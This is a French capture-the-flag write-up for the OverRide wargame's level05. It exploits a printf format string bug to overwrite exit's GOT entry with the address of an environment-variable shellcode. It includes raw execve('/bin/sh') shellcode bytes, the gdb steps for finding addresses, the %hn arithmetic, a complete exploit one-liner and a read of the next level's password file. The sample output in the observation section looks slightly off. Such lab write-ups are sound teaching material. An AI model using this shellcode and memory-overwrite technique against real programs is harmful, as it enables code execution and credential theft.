## Observation

Le `printf` n'est pas protégé, il affiche directement `buf` :

​```
level05@OverRide:~$ ./level05
/bin/sh
​```

C'est une **vulnérabilité de format string** : on peut l'exploiter pour
réécrire une entrée de la GOT.

## Cible : la GOT de exit

Juste après le `printf`, le programme appelle `exit`. On réécrit donc son
entrée GOT pour la faire pointer vers notre shellcode.

​```
objdump -R level05
080497e0 R_386_JUMP_SLOT   exit
​```

Adresse GOT de `exit` : **`0x080497e0`**.

## Principe de `%n`

`%n` écrit le **nombre de caractères déjà affichés** à l'adresse pointée par
l'argument correspondant.

- `%<x>d` : affiche `x` caractères (du remplissage).
- `%<y>$n` : écrit le compteur de caractères à l'adresse donnée par le
  `y`-ième argument.

Structure visée : `[adresse GOT] + %<valeur - 4>d + %<position>$n`.

Il faut donc connaître l'adresse du shellcode.

## Trouver la position de `buf` dans les arguments

```
level05@OverRide:~$ python -c 'print "aaaa" + "|%x"*15' | ./level05
aaaa|64|f7fcfac0|f7ec3add|ffffd5ff|ffffd5fe|0|ffffffff|ffffd684|f7fdb000|61616161|7c78257c|257c7825|78257c78|7c78257c|257c7825
```
On compte à quel `%x` apparaît `0x61616161` : ici c'est le **10ᵉ**. Donc
`buf` commence à la **position 10** dans les arguments de `printf`.

## Le shellcode (dans une variable d'environnement)

level05 n'a pas de moniteur d'execve, on pourrait mettre le shellcode dans
`buf` — mais `buf` est limité à 100 octets et subit une conversion
majuscules→minuscules, ce qui est pénible. On le place donc dans une variable
d'environnement :

​```bash
export SC=$(python2 -c 'print "\x90"*200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"')
​```

(Un grand NOP sled `\x90` en tête donne de la tolérance sur l'adresse.)

Adresse de la variable via gdb (l'adresse diffère un peu hors gdb, mais le NOP
sled absorbe l'écart) :

​```
(gdb) b main
Breakpoint 1 at 0x8048449
(gdb) r
Breakpoint 1, 0x08048449 in main ()
(gdb) p (char *)getenv("SC")
$1 = 0xffffde42
​```

## Écrire 0xffffde42 avec deux `%hn`

Écrire les 4 octets d'un coup demanderait d'afficher ~4,3 milliards de
caractères. On utilise `%hn` (écriture sur 2 octets), en coupant l'adresse en
deux moitiés :

​```
octets bas  : 0xde42 = 56898  -> afficher 56898 car., %hn écrit à 0x080497e0
octets hauts: 0xffff = 65535  -> continuer à 65535,   %hn écrit à 0x080497e2
​```

Les deux compteurs sont < 65536, soit ~6 Ko de sortie au total (instantané).
Les deux `%hn` écrivent respectivement à GOT et GOT+2 → recomposent
`0xffffde42`.

Le compteur de caractères ne fait qu'augmenter, donc on écrit d'abord la plus
petite moitié :

​```
56898 - 8      = 56890   (8 = les 8 octets des deux adresses déjà affichés)
65535 - 56898  = 8637
​```

## Exploitation

​```
(python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%56890d%10\$hn' + '%8637d%11\$hn'"; cat -) | ./level05
​```

Agencement de l'entrée :

- `\xe0\x97\x04\x08` = `0x080497e0` (GOT exit)      → argument 10
- `\xe2\x97\x04\x08` = `0x080497e2` (GOT exit + 2)   → argument 11
- `%56890d%10$hn` : affiche jusqu'à 56898 car., écrit la moitié basse à GOT
- `%8637d%11$hn`  : affiche jusqu'à 65535, écrit la moitié haute à GOT+2

Quand `exit` est appelé, il saute dans le shellcode (`0xffffde42` → NOP sled →
`execve("/bin/sh")`). `cat -` garde l'entrée ouverte pour taper des commandes :

​```
cat /home/users/level06/.pass
​```

Remarque : tous les octets de l'entrée (adresses `e0 97 04 08`, chiffres,
`% d $ h n`) sont hors de la plage `A-Z`, donc la conversion en minuscules ne
les abîme pas.